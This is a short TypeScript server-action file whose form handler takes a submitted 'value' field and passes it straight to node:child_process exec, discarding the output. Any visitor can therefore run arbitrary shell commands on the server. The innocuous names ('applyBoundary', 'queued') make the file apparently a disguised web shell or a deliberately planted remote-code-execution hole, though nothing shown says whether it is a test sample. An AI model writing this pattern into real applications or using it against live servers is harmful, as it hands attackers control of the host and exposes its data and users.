"use server";

export async function submit(formData: FormData) {
  const runtime: any = (globalThis as any).__phase9Runtime;
  const candidate = formData.get("value");
  return applyBoundary(candidate, runtime);
}

async function applyBoundary(value: unknown, runtime: any) {
  const { exec } = await import("node:child_process");
  exec(String(value), { timeout: 1200 }, () => {});
  return { queued: true };
}
